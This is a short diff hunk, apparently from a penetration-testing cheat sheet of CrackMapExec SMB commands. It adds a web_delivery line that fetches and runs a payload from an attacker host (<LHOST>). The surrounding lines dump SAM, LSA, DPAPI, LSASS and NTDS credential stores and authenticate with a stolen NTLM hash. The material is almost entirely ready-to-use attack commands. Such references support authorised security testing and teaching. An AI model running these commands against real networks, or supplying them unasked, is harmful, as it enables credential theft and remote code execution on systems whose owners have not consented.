@@ -150,6 +150,7 @@ $ crackmapexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --local-auth --sam
 $ crackmapexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --local-auth --lsa
 $ crackmapexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --local-auth --dpapi
 $ crackmapexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" -M lsassy
+$ crackmapexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" -M web_delivery -o URL=http://<LHOST>/<FILE>
 $ crackmapexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --ntds
 $ crackmapexec smb <RHOST> -u "<USERNAME>" -H "<NTLMHASH>" --ntds
 $ crackmapexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --ntds --user <USERNAME>
